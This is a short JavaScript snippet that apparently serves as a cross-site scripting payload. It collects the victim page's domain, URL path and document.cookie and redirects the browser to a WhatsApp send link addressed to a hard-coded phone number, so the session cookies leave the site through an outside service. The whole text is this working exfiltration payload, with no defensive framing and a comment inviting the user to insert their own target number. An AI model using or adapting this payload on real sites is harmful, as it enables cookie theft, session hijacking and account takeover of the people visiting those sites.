var phoneNumber = '18056009130'; // Replace with the target phone number
var messageContent = 'XSS Alert in ' + document.domain +
    '%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document.location.hostname + document.location.pathname +
    '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document.cookie;

function whatsappSend(phoneNumber, messageContent) {
    // Replace the following line with the appropriate WhatsApp API endpoint and authentication
    var apiUrl = 'https://api.whatsapp.com/send?phone=' + phoneNumber + '&text=' + encodeURIComponent(messageContent);
    window.location.href = apiUrl;
}

whatsappSend(phoneNumber, messageContent);
